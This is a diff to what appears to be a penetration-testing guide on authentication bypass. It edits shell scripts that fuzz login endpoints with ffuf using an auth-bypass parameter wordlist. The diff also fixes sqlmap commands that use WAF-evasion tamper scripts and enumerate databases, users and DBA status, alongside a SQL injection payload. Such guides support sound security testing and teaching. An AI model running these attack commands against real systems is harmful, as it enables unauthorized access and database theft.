@@ -192,6 +192,8 @@ If a 400/500 error appears, modify the payload to `' OR 1=2 --` and submit again
 
 ### Parameter Modification <a href="#parameter-modification" id="parameter-modification"></a>
 
+#### [Katana ](https://github.com/projectdiscovery/katana)& [FFUF](https://github.com/ffuf/ffuf)
+
 {% hint style="info" %}
 Create Script
 {% endhint %}
@@ -309,7 +311,7 @@ HEADERS=(
 )
 
 # Auth Bypass Header
-cat > /tmp/auth_bypass.txt << EOF
+cat > /tmp/auth-bypass-params.txt << EOF
 authenticated=yes
 authenticated=true
 authenticated=1
@@ -346,13 +348,13 @@ EOF
 if [[ "$METHOD" == "get" ]]; then
     FFUF_URL="${FULL_ACTION}?${DATA}"
     ffuf -u "$FFUF_URL?FUZZ" \
-         -w "/tmp/auth_bypass.txt:FUZZ" \
+         -w "/tmp/auth-bypass-params.txt:FUZZ" \
          -X GET \
          -ac -c -r -mc 200 \
          "${HEADERS[@]}"
 else
     ffuf -u "$FULL_ACTION?FUZZ" \
-         -w "/tmp/auth_bypass.txt:FUZZ" \
+         -w "/tmp/auth-bypass-params.txt:FUZZ" \
          -X POST -d "$DATA" \
          -ac -c -r -mc 200 \
          "${HEADERS[@]}"
@@ -526,9 +528,8 @@ if [[ "$METHOD" == "get" ]]; then
         --headers="$SQLMAP_HEADERS" \
         --cookie="$COOKIES" \
         --batch --level=5 --risk=3 -v 3 \
-        --user-random-agent --threads=10 \
-        --tamper=space2comment,randomcmase \
-        --string="dashboard\|welcome\|home\|profile\|logout\|admin" \
+        --random-agent --threads=10 \
+        --tamper=space2comment,randomcase \
         --not-string="invalid\|incorrect\|failed\|error\|denied" \
         --dbs --banner --current-user --current-db --is-dba
 
@@ -539,8 +540,7 @@ else
         --cookie="$COOKIES" \
         --batch --level=5 --risk=3 -v 3 \
         --random-agent --threads=10 \
-        --tamper=space2comment,randomcmase \
-        --string="dashboard\|welcome\|home\|profile\|logout\|admin" \
+        --tamper=space2comment,randomcase \
         --not-string="invalid\|incorrect\|failed\|error\|denied" \
         --dbs --banner --current-user --current-db --is-dba
 fi
